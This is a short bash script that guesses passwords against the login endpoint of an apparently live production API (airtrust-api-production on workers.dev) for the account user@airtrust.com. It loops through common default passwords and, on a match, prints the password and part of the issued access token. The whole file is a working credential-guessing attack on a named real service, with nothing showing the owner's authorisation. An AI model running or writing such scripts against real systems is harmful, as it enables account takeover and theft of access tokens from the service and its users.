#!/bin/bash
set -euo pipefail
BASE="https://airtrust-api-production.airtrust.workers.dev"
for pass in "Admin@123" "User@123" "user@123" "Teste@123" "teste123" "Admin123" "User123" "Airtrust@123"; do
  RESP=$(curl -s -X POST "${BASE}/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"user@airtrust.com\",\"senha\":\"${pass}\"}")
  SUCCESS=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('success',False))" 2>/dev/null || echo "error")
  if [ "$SUCCESS" = "True" ]; then
    echo "FOUND: password=$pass"
    echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['accessToken'][:50])"
    exit 0
  fi
done
echo "No password found"
